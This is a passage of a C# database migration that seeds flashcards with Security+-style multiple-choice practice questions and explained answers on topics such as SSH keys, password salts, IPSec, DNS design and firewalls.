            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 483, "\r\n77. B. The correct answer is to turn off any remote access to such\r\ndevices that is not absolutely needed. Many peripheral devices\r\ncome with SSH (Secure Shell), Telnet, or similar services. If you\r\nare not using them, turn them off. Many peripherals don’t have\r\ndisks to encrypt, making full-disk encryption (FDE) a less useful\r\nchoice. Fuzz testing is used to test code, not devices, and\r\nperipherals are unlikely to support digital certificates in most\r\ncases.\r\n", 3, "\r\n77. Emiliano is a network administrator and is concerned about the security of peripheral\r\ndevices. Which of the following would be a basic step he could take to improve security for\r\nthose devices?\r\nA. Implement FDE.\r\nB. Turn off remote access (SSH, Telnet, etc.) if not needed.\r\nC. Utilize fuzz testing for all peripherals.\r\nD. Implement digital certificates for all peripherals.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 484, "\r\n78. C. Manual code review is a type of static code review where\r\nreviewers read through source code to attempt to find flaws in\r\nthe code. Dynamic code review requires running the code, Fagan\r\ntesting is a formal code review process that works through\r\nmultiple phases of the development process, and fuzzing is a\r\nform of dynamic inspection that sends unexpected values to a\r\nrunning program.\r\n", 3, "\r\n78. What type of code analysis is manual code review?\r\nA. Dynamic code review\r\nB. Fagan code review\r\nC. Static code review\r\nD. Fuzzing\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 485, "\r\n79. C. Samantha should place her public SSH key in the .ssh\r\ndirectory in her home directory on the remote server. Private\r\nkeys should never be outside of your control, and unlike many\r\nLinux configurations, SSH keys are not kept in the /etc/\r\ndirectory.\r\n", 3, "\r\n79. Samantha has used ssh-keygen to generate new SSH keys. Which SSH key should she place\r\non the server she wants to access, and where is it typically stored on a Linux system?\r\nA. Her public SSH key, /etc/\r\nB. Her private SSH key, /etc/\r\nC. Her public SSH key, ~/.ssh\r\nD. Her private SSH key, ~/.ssh\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 486, "\r\n80. C. The correct answer is to use static code analysis. Memory\r\nleaks are usually caused by failure to deallocate memory that has\r\nbeen allocated. A static code analyzer can check to see if all\r\nmemory allocation commands ( malloc , alloc , etc.) have a\r\nmatching deallocation command. Fuzzing involves entering data\r\nthat is outside expected values to see how the application\r\nhandles it. Stress testing involves testing how a system handles\r\nextreme workloads. Normalization is a technique for\r\ndeduplicating a database.\r\n", 3, "\r\n80. Ixxia is a software development team manager. She is concerned about memory leaks in code.\r\nWhat type of testing is most likely to find memory leaks?\r\nA. Fuzzing\r\nB. Stress testing\r\nC. Static code analysis\r\nD. Normalization\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 487, "\r\n81. D. Load balancers provide a virtual IP, or VIP. Traffic sent to\r\nthe VIP is directed to servers in the pool based on the loadbalancing\r\nscheme that that pool is using—often a round-robin\r\nscheme, but other versions that include priority order and\r\ncapacity tracking or ratings are also common. The load\r\nbalancer’s IP address is normally used to administer the system,\r\nand individual IP addresses for the clustered hosts are shielded\r\nby the load balancer to prevent traffic from consistently going to\r\nthose hosts, thus creating a failure or load point.\r\n", 3, "\r\n81. What IP address does a load balancer provide for external connections to connect to web\r\nservers in a load-balanced group?\r\nA. The IP address for each server, in a prioritized order\r\nB. The load balancer’s IP address\r\nC. The IP address for each server in a round-robin order\r\nD. A virtual IP address\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 488, "\r\n82. D. In a well-implemented password hashing scheme, unique\r\nrandom bits called salts are added to each password before they\r\nare hashed. This makes generating a rainbow table or otherwise\r\nbrute-forcing hashes for all of the passwords stored in a\r\ndatabase extremely time-consuming. The remaining options\r\nwere made up and are not actual security terms.\r\n", 3, "\r\n82. What term describes random bits that are added to a password before it is hashed and stored\r\nin a database?\r\nA. Flavoring\r\nB. Rainbow-armor\r\nC. Bit-rot\r\nD. Salt\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 489, "\r\n83. A. The correct answer is to use Secure Shell (SSH). This\r\nprotocol is encrypted. SSH also authenticates the user with\r\npublic key cryptography. Telnet is insecure and does not encrypt\r\ndata. RSH, or Remote Shell, sends at least some data\r\nunencrypted and is also insecure. SNMP, or Simple Network\r\nManagement Protocol, is used to manage a network and is not\r\nused for remote communications.\r\n", 3, "\r\n83. Victor is a network administrator for a medium-sized company. He wants to be able to access\r\nservers remotely so that he can perform small administrative tasks from remote locations.\r\nWhich of the following would be the best protocol for him to use?\r\nA. SSH\r\nB. Telnet\r\nC. RSH\r\nD. SNMP\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 490, "\r\n84. A. Resource-based policies are attached to resources and\r\ndetermine who has access to a resource, such as a group of\r\nsysadmins or developers, and what actions they can perform on\r\nthe resource. Cloud services have different terms for monitoring\r\ntheir resource usage; these terms may vary from service to\r\nservice.\r\n", 3, "\r\n84. Dan configures a resource-based policy in his Amazon account. What control has\r\nhe deployed?\r\nA. A control that determines who has access to the resource, and the actions they can take\r\non it\r\nB. A control that determines the amount that service can cost before an alarm is sent\r\nC. A control that determines the amount of a finite resource that can be consumed before\r\nan alarm is set\r\nD. A control that determines what an identity can do\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 491, "\r\n85. A. Networked sensor appliances are deployed in many\r\ndatacenters to gather information about temperature and\r\nhumidity as part of the environmental monitoring system. Fire\r\ndetection and suppression systems are not typically mounted in\r\nracks, and power quality and reliability is measured by PDUs\r\n(power distribution units), UPS (uninterruptable power\r\nsupplies), and other power infrastructure.\r\n", 3, "\r\n85. Charlene’s company uses rack-mounted sensor appliances in their datacenter. What are\r\nsensors like these typically monitoring?\r\nA. Temperature and humidity\r\nB. Smoke and fire\r\nC. Power quality and reliability\r\nD. None of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 492, "\r\n86. C. Secure IMAP’s default port is TCP 993. Laurel can easily\r\nguess that the system offers a TLS-protected version of IMAP for\r\nclients to use to retrieve email messages. The default port for\r\nsecure POP is 995, and for secure SMTP the default port is 587.\r\nS/MIME does not have a specific port, as it is used to encrypt\r\nthe content of email messages.\r\n", 3, "\r\n86. Laurel is reviewing the configuration for an email server in her organization and discovers\r\nthat there is a service running on TCP port 993. What secure email service has she most likely\r\ndiscovered?\r\nA. Secure POP3\r\nB. Secure SMTP\r\nC. Secure IMAP (IMAPS)\r\nD. Secure MIME (SMIME)\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 481, "\r\n75. D. The correct answer is to first test patches. It is always\r\npossible that a patch might cause issues for one or more current\r\napplications. This is particularly a concern with applications that\r\nhave a lot of interaction with the host operating system. An\r\noperating system patch can prevent the application from\r\nexecuting properly. But as soon as the patches are tested, a\r\nphased rollout to the company should begin. Automatic\r\npatching is not recommended in corporate environments\r\nbecause a patch could possibly interfere with one or more\r\napplications—thus, a managed patch deployment process is\r\nimplemented that requires more administrative time but avoids\r\noutages due to patches with issues in an organization’s specific\r\nenvironment. Having individual users patch their own machines\r\nis a bad idea and will lead to inconsistent patching and the\r\napplication of untested patches. Delegating patch management\r\nto managers instead of IT staff can lead to problems, too, due to\r\nvarying skillsets and practices.\r\n", 3, "\r\n75. Sarah is the CIO for a small company. The company uses several custom applications that\r\nhave complicated interactions with the host operating system. She is concerned about\r\nensuring that systems on her network are all properly patched. What is the best approach in\r\nher environment?\r\nA. Implement automatic patching.\r\nB. Implement a policy that has individual users patch their systems.\r\nC. Delegate patch management to managers of departments so that they can find the best\r\npatch management for their departments.\r\nD. Immediately deploy patches to a test environment; then as soon as testing is complete,\r\nhave a staged rollout to the production network.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 493, "\r\n87. C. Ad hoc wireless networks operate in a point-to-point\r\ntopology. Infrastructure mode access points work in a point-tomultipoint\r\ntopology. Star and bus models are used in wired\r\nnetworks.\r\n", 3, "\r\n87. What type of topology does an ad hoc wireless network use?\r\nA. Point-to-multipoint\r\nB. Star\r\nC. Point-to-point\r\nD. Bus\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 495, "\r\n89. D. The Security+ exam refers to password managers as\r\npassword vaults. Samantha should recommend a password vault\r\nthat will allow her users to generate, store, and use many\r\npasswords securely. None of the other options are good advice\r\nfor password use and storage.\r\n", 3, "\r\n89. Samantha has been asked to provide a recommendation for her organization about password\r\nsecurity practices. Users have complained that they have to remember too many passwords\r\nas part of their job and that they need a way to keep track of them. What should Samantha\r\nrecommend?\r\nA. Recommend that users write passwords down near their workstation.\r\nB. Recommend that users use the same password for sites with similar data or risk profiles.\r\nC. Recommend that users change their standard passwords slightly based on the site they\r\nare using.\r\nD. Recommend a password vault or manager application.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 496, "\r\n90. A. Port security filters by MAC address, allowing whitelisted\r\nMAC addresses to connect to the port and blocking blacklisted\r\nMAC addresses. Port security can be static, using a\r\npredetermined list or dynamically allowing a specific number of\r\naddresses to connect, or it can be run in a combination mode of\r\nboth static and dynamic modes.\r\n", 3, "\r\n90. Matt has enabled port security on the network switches in his building. What does port\r\nsecurity do?\r\nA. Filters by MAC address\r\nB. Prevents routing protocol updates from being sent from protected ports\r\nC. Establishes private VLANs\r\nD. Prevents duplicate MAC addresses from connecting to the network\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 497, "\r\n91. C. Authentication headers (AHs) provide complete packet\r\nintegrity, authenticating the packet and the header.\r\nAuthentication headers do not provide any encryption at all, and\r\nauthentication headers authenticate the entire packet, not just\r\nthe header.\r\n", 3, "\r\n91. Tom is responsible for VPN connections in his company. His company uses IPSec for VPNs.\r\nWhat is the primary purpose of AH in IPSec?\r\nA. Encrypt the entire packet.\r\nB. Encrypt just the header.\r\nC. Authenticate the entire packet.\r\nD. Authenticate just the header.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 498, "\r\n92. B. A split horizon DNS implementation deploys distinct DNS\r\nservers for two or more environments, ensuring that those\r\nenvironments receive DNS information appropriate to the DNS\r\nview that their clients should receive. Domain Name System\r\nSecurity Extensions (DNSSEC) is a DNS security set of\r\nspecifications to help protect DNS data. DMZ DNS and DNS\r\nproxying are not design patterns or common terms used in the\r\nsecurity or networking field.\r\n", 3, "\r\n92. Miles wants to ensure that his internal DNS cannot be queried by outside users. What DNS\r\ndesign pattern uses different internal and external DNS servers to provide potentially different\r\nDNS responses to users of those networks?\r\nA. DNSSEC\r\nB. Split horizon DNS\r\nC. DMZ DNS\r\nD. DNS proxying\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 499, "\r\n93. A. Network taps copy all traffic to another destination, allowing\r\ntraffic visibility without a device inline. They are completely\r\npassive methods of getting network traffic to a central location.\r\nPort mirroring would get all the traffic to the network-based\r\nintrusion prevention system (NIPS) but is not completely\r\npassive. It requires the use of resources on switches to route a\r\ncopy of the traffic. Incorrect switch configurations can cause\r\nlooping. Configuring loop detection can prevent looped ports.\r\nPutting a network IPS on every segment can be very expensive\r\nand require extensive configuration work. Option D is incorrect.\r\nThis is not the assignment. Setting up a NIPS on each segment\r\nwould also dramatically increase administrative efforts.\r\n", 3, "\r\n93. Abigail is responsible for setting up a network-based intrusion prevention system (NIPS) on\r\nher network. The NIPS is located in one particular network segment. She is looking for a\r\npassive method to get a copy of all traffic to the NIPS network segment so that it can analyze\r\nthe traffic. Which of the following would be her best choice?\r\nA. Using a network tap\r\nB. Using port mirroring\r\nC. Setting the NIPS on a VLAN that is connected to all other segments\r\nD. Setting up a NIPS on each segment\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 500, "\r\n94. C. Federating RADIUS allows organizations to permit users\r\nfrom other partner organizations to authenticate against their\r\nhome systems, and then be allowed on to the local organization’s\r\nnetwork. An example of this is the eduroam federation used by\r\nhigher education institutions to permit students, faculty, and\r\nstaff to use college networks anywhere they go where eduroam is\r\nin place. Preshared keys are determined by the location\r\norganization and would not permit enterprise credentials from\r\nother organizations to be used. OpenID is used for web\r\nauthentication, and 802.11q is a trunking protocol.\r\n", 3, "\r\n94. Amanda wants to allow users from other organizations to log in to her wireless network.\r\nWhat technology would allow her to do this using their own home organization’s\r\ncredentials?\r\nA. Preshared keys\r\nB. 802.11q\r\nC. RADIUS federation\r\nD. OpenID Connect\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 501, "\r\n95. C. Context-aware authentication can take into account\r\ninformation like geolocation to ensure that the devices can only\r\nbe logged into when they are inside of the facility’s boundaries.\r\nThat means the devices will only be useful on-site and can help\r\nprotect the data and applications on the devices. Neither PINs\r\nnor biometrics can do this, and content-aware authentication\r\nwas made up for this question.\r\n", 3, "\r\n95. Nathan wants to ensure that the mobile devices his organization has deployed can only be\r\nused in the company’s facilities. What type of authentication should he deploy to ensure this?\r\nA. PINs\r\nB. Biometrics\r\nC. Context-aware authentication\r\nD. Content-aware authentication\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 502, "\r\n96. B. A TPM, or Trusted Platform Module, is a secure\r\ncryptoprocessor used to provide a hardware root of trust for\r\nsystems. They enable secure boot and boot attestation\r\ncapabilities, and include a random number generator, the ability\r\nto generate cryptographic keys for specific uses, and the ability\r\nto bind and seal data used for processes the TPM supports.\r\n", 3, "\r\n96. Which of the following best describes a TPM?\r\nA. Transport Protection Mode\r\nB. A secure cryptoprocessor\r\nC. A DNSSEC extension\r\nD. Total Patch Management\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 503, "\r\n97. B. Internet key exchange (IKE) is used to set up security\r\nassociations (SAs) on each end of the tunnel. The security\r\nassociations have all the settings (i.e., cryptographic algorithms,\r\nhashes) for the tunnel. IKE is not directly involved in encrypting\r\nor authenticating. IKE itself does not establish the tunnel—it\r\nestablishes the SAs.\r\n", 3, "\r\n97. Janice is explaining how IPSec works to a new network administrator. She is trying to explain\r\nthe role of IKE. Which of the following most closely matches the role of IKE in IPSec?\r\nA. It encrypts the packet.\r\nB. It establishes the SAs.\r\nC. It authenticates the packet.\r\nD. It establishes the tunnel.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 504, "\r\n98. A. A root certificate is the base certificate that signs an entire\r\ncertificate chain. A common security practice to protect these\r\nincredibly important certificates is to keep the root certificate\r\nand CA offline to prevent the potential of compromise or\r\nexposure. Machine/computer, user, and email certificates are\r\ndeployed and used throughout organizations and, since they are\r\nused on a frequent basis, aren’t likely be to kept offline.\r\n", 3, "\r\n98. What certificate is most likely to be used by an offline certificate authority (CA)?\r\nA. Root\r\nB. Machine/computer\r\nC. User\r\nD. Email\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 505, "\r\n99. A. The NIPS is not seeing the traffic on that network segment.\r\nBy implementing port mirroring, the traffic from that segment\r\ncan be copied to the segment where the NIPS is installed.\r\nInstalling a network IPS on the segment would require\r\nadditional resources. This would work but is not the most\r\nefficient approach. Nothing in this scenario suggests that the\r\nNIPS is inadequate. It just is not seeing all the traffic. Finally,\r\nisolating the segment to its own VLAN would isolate that\r\nnetwork segment but would still not allow the NIPS to analyze\r\nthe traffic from that segment.\r\n", 3, "\r\n99. Emily manages the IDS/IPS for her network. She has a network-based intrusion prevention\r\nsystem (NIPS) installed and properly configured. It is not detecting obvious attacks on one\r\nspecific network segment. She has verified that the NIPS is properly configured and working\r\nproperly. What would be the most efficient way for her to address this?\r\nA. Implement port mirroring for that segment.\r\nB. Install a NIPS on that segment.\r\nC. Upgrade to a more effective NIPS.\r\nD. Isolate that segment on its own VLAN.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 494, "\r\n88. C. Only using code that is digitally signed verifies the creator of\r\nthe software. For example, if a printer/multifunction device\r\n(MFD) driver is digitally signed, this gives you confidence that it\r\nreally is a printer driver from the vendor it purports to be from,\r\nand not malware masquerading as a printer driver. Signed\r\nsoftware gives you a high degree of confidence that it is not\r\nmalware but does not provide a guarantee. For example, the\r\ninfamous Flame virus was signed with a compromised Microsoft\r\ndigital certificate. Digital signing of software has no effect on\r\npatch management. Finally, digitally signed software will not\r\nexecute faster or slower than unsigned software.\r\n", 3, "\r\n88. What is the primary advantage of allowing only signed code to be installed on computers?\r\nA. It guarantees that malware will not be installed.\r\nB. It improves patch management.\r\nC. It verifies who created the software.\r\nD. It executes faster on computers with a Trusted Platform Module (TPM).\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 506, "\r\n100. B. Tokenization is used to protect data by substituting tokens\r\nfor sensitive data without changing the length or data type. This\r\nallows databases to handle the data in the same way as it was\r\nprior to tokenization, ensuring that existing software will not\r\nrun into problems due to the data being changed. Encryption\r\nprovides similar protection but will normally change either the\r\ndata length, the data type, or both. Hashing is one-way, which\r\nmeans it is not a good fit for many scenarios where tokenization\r\nor encryption will protect data. Rotation is not a security method\r\nused for this type of work.\r\n", 3, "\r\n100. Dana wants to protect data in a database without changing characteristics like the data\r\nlength and type. What technique can she use to do this most effectively?\r\nA. Hashing\r\nB. Tokenization\r\nC. Encryption\r\nD. Rotation\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 480, "\r\n74. A. The correct answer is to assign digital certificates to the\r\nauthorized users and to use these to authenticate them when\r\nlogging in. This is an effective way to ensure that only authorized\r\nusers can access the application. Although the remaining\r\noptions are all good security measures, they are not the best way\r\nto authenticate the client and prevent unauthorized access to the\r\napplication.\r\n", 3, "\r\n74. Edward is responsible for web application security at a large insurance company. One of the\r\napplications that he is particularly concerned about is used by insurance adjusters in the field.\r\nHe wants to have strong authentication methods to mitigate misuse of the application. What\r\nwould be his best choice?\r\nA. Authenticate the client with a digital certificate.\r\nB. Implement a very strong password policy.\r\nC. Secure application communication with Transport Layer Security (TLS).\r\nD. Implement a web application firewall (WAF).\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 478, "\r\n72. B. Rate limiting and back-off algorithms both limit how quickly\r\nqueries can be performed. Requiring authentication would\r\nrestrict who could access the directory. Requiring LDAPS\r\n(Lightweight Directory Access Protocol over SSL) does not\r\nprevent enumeration, but it does provide security for the\r\nqueried information as it transits networks.\r\n", 3, "\r\n72. Alaina wants to prevent bulk gathering of email addresses and other directory information\r\nfrom her web-exposed LDAP directory. Which of the following solutions would not help\r\nwith this?\r\nA. Using a back-off algorithm\r\nB. Implementing LDAPS\r\nC. Requiring authentication\r\nD. Rate limiting queries\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 454, "\r\n48. D. Nelson is using a whitelisting (or allowed list) tool. Tools\r\nlike this allow only specific applications to be installed and run\r\non a system and often use hashes of known good applications to\r\nensure that the applications are those that are permitted. A\r\nblacklisting (or blocked list) tool prevents specific applications\r\nor files from being used, stored, or downloaded to a system.\r\nAlthough antivirus and antimalware tools may have similar\r\nfeatures, the most accurate answer here is whitelisting.\r\n", 3, "\r\n48. Nelson uses a tool that lists the specific applications that can be installed and run on a\r\nsystem. The tool uses hashes of the application’s binary to identify each application to ensure\r\nthat the application matches the filename provided for it. What type of tool is Nelson using?\r\nA. Antivirus\r\nB. Blacklisting\r\nC. Antimalware\r\nD. Whitelisting\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 455, "\r\n49. B. A stateful inspection firewall examines the content and\r\ncontext of each packet it encounters. This means that a stateful\r\npacket inspection (SPI) firewall understands the preceding\r\npackets that came from the same IP address, and thus the\r\ncontext of the communications. This makes certain attacks, like\r\na SYN flood, almost impossible. Packet filtering firewalls\r\nexamine each packet but not the context. Application-layer\r\nfirewalls can use SPI or simple packet filtering, but their primary\r\nrole is to examine application-specific issues. A common\r\nexample is a web application firewall. A gateway firewall is\r\nsimply a firewall at the network gateway. This does not tell us\r\nwhether it is packet filtering or SPI.\r\n", 3, "\r\n49. Which type of firewall examines the content and context of each packet it encounters?\r\nA. Packet filtering firewall\r\nB. Stateful packet filtering firewall\r\nC. Application layer firewall\r\nD. Gateway firewall\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 456, "\r\n50. A. Wireless network heatmaps are used to show how strong\r\nwireless network signals are throughout a building or location.\r\nScott can use a heatmap like this to see where the wireless signal\r\ndrops off or where interference may occur. A network diagram\r\nwould show the logical layout of a network. A demilitarized zone\r\n(DMZ) is a network security zone that is exposed to a higher risk\r\nregion, and a zone map is not a common security term.\r\n", 3, "\r\n50. As part of his wireless network deployment efforts, Scott generates the image shown here.\r\nWhat term is used to describe this type of visualization of wireless networks?\r\nA. A heatmap\r\nB. A network diagram\r\nC. A zone map\r\nD. A DMZ\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 457, "\r\n51. B. A demilitarized zone (DMZ) is a separate subnet coming off\r\nthe separate router interface. Public traffic may be allowed to\r\npass from the external public interface to the DMZ, but it won’t\r\nbe allowed to pass to the interface that connects to the internal\r\nprivate network. A guest network provides visitors with Internet\r\naccess. An intranet consists of internal web resources.\r\nFrequently companies put up web pages that are accessible only\r\nfrom within the network for items like human resources\r\nnotifications, vacation requests, and so forth. A virtual LAN, or\r\nVLAN, is used to segment your internal network.\r\n", 3, "\r\n51. You’re designing a new network infrastructure so that your company can allow unauthenticated\r\nusers connecting from the Internet to access certain areas. Your goal is to protect the\r\ninternal network while providing access to those areas. You decide to put the web server on a\r\nseparate subnet open to public contact. What is this subnet called?\r\nA. Guest network\r\nB. DMZ\r\nC. Intranet\r\nD. VLAN\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 458, "\r\n52. C. The application includes input validation techniques that are\r\nused to ensure that unexpected or malicious input does not\r\ncause problems with the application. Input validation\r\ntechniques will strip out control characters, validate data, and\r\nperform a variety of other actions to clean input before it is\r\nprocessed by the application or stored for future use. This\r\nvalidation may help prevent buffer overflows, but other\r\ntechniques described here are not used for buffer overflow\r\nprevention. String injection is actually something this helps to\r\nprevent, and schema validation looks at data to ensure that\r\nrequests match a schema, but again this is a narrower\r\ndescription than the broad range of input validation occurring in\r\nthe description.\r\n", 3, "\r\n52. Madhuri’s web application converts numbers that are input into fields by specifically typing\r\nthem and then applies strict exception handling. It also sets a minimum and maximum length\r\nfor the inputs that it allows and uses predefined arrays of allowed values for inputs like\r\nmonths or dates. What term describes the actions that Madhuri’s application is performing?\r\nA. Buffer overflow prevention\r\nB. String injection\r\nC. Input validation\r\nD. Schema validation\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 459, "\r\n53. C. WPA3 supports SAE, or simultaneous authentication of\r\nequals, providing a more secure way to authenticate that limits\r\nthe potential for brute-force attacks and allows individuals to\r\nuse different passwords. WPA is not as secure as WPA2, and\r\nWEP is the oldest, and least secure, wireless security protocol.\r\n", 3, "\r\n53. You’re outlining your plans for implementing a wireless network to upper management.\r\nWhat wireless security standard should you adopt if you don’t want to use enterprise authentication\r\nbut want to provide secure authentication for users that doesn’t require a shared\r\npassword or passphrase?\r\nA. WPA3\r\nB. WPA\r\nC. WPA2\r\nD. WEP\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 460, "\r\n54. A. In order to stop attack traffic, an IPS needs to be deployed\r\ninline. Deployments that use a network tap receive a copy of the\r\ndata without being in the flow of traffic, which makes them ideal\r\nfor detection but removes the ability to stop traffic. Deploying as\r\nan intrusion detection system (IDS) instead of an IPS means\r\nthat the system will only detect, not stop, attacks.\r\n", 3, "\r\n54. Brandon wants to ensure that his intrusion prevention system (IPS) is able to stop attack\r\ntraffic. Which deployment method is most appropriate for this requirement?\r\nA. Inline, deployed as an IPS\r\nB. Passive via a tap, deployed as an IDS\r\nC. Inline, deployed as an IDS\r\nD. Passive via a tap, deployed as an IPS\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 461, "\r\n55. B. The correct answer is to use a sandboxed environment to\r\ntest the malware and determine its complete functionality. A\r\nsandboxed system could be an isolated virtual machine (VM) or\r\nan actual physical machine that is entirely isolated from the\r\nnetwork. Leaving the malware on a production system is never\r\nthe correct approach. You should test or analyze the malware to\r\ndetermine exactly what malware it is, allowing you to respond to\r\nthe threat properly. A honeypot is used for luring and trapping\r\nattackers, not for testing malware.\r\n", 3, "\r\n55. You are the chief security officer (CSO) for a large company. You have discovered malware\r\non one of the workstations. You are concerned that the malware might have multiple\r\nfunctions and might have caused more security issues with the computer than you can currently\r\ndetect. What is the best way to test this malware?\r\nA. Leave the malware on that workstation until it is tested.\r\nB. Place the malware in a sandbox environment for testing.\r\nC. It is not important to analyze or test it; just remove it from the machine.\r\nD. Place the malware on a honeypot for testing.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 462, "\r\n56. B. Hardening is the process of improving the security of an\r\noperating system or application. One of the primary methods of\r\nhardening a trusted OS is to eliminate unneeded protocols. This\r\nis also known as creating a secure baseline that allows the OS to\r\nrun safely and securely. FDE is full-disk encryption, a SED is a\r\nself-encrypting drive, and baselining is the process of\r\nestablishing security standards.\r\n", 3, "\r\n56. You are trying to increase security at your company. You’re currently creating an outline of\r\nall the aspects of security that will need to be examined and acted on. Which of the following\r\nterms describes the process of improving security in a trusted OS?\r\nA. FDE\r\nB. Hardening\r\nC. SED\r\nD. Baselining\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 463, "\r\n57. C. Although trust in the site is likely to be reduced because\r\nusers will receive warnings, the actual underlying encryption\r\ncapabilities will not change. Users will not be redirected to the\r\ncertificate authority’s site, and if they click past the warnings,\r\nusers will be able to continue normally and with an encrypted\r\nconnection.\r\n", 3, "\r\n57. Melissa’s website provides users who access it via HTTPS with a Transport Layer Security\r\n(TLS) connection. Unfortunately, Melissa forgot to renew her certificate, and it is presenting\r\nusers with an error. What happens to the HTTPS connection when a certificate expires?\r\nA. All traffic will be unencrypted.\r\nB. Traffic for users who do not click OK at the certificate error will be unencrypted.\r\nC. Trust will be reduced, but traffic will still be encrypted.\r\nD. Users will be redirected to the certificate authority’s site for a warning until the certificate\r\nis renewed.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 464, "\r\n58. D. Isaac knows that trusting client systems to be secure is not a\r\ngood idea, and thus ensuring that validation occurs on a trusted\r\nclient is not an appropriate recommendation. Ensuring that\r\nvalidation occurs on a trusted server, that client data is\r\nvalidated, and that data types and ranges are reasonable are all\r\ngood best practices for him to recommend.\r\n", 3, "\r\n58. Isaac is reviewing his organization’s secure coding practices document for customer-facing\r\nweb applications and wants to ensure that their input validation recommendations are\r\nappropriate. Which of the following is not a common best practice for input validation?\r\nA. Ensure validation occurs on a trusted server.\r\nB. Validate all client-supplied data before it is processed.\r\nC. Validate expected data types and ranges.\r\nD. Ensure validation occurs on a trusted client.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
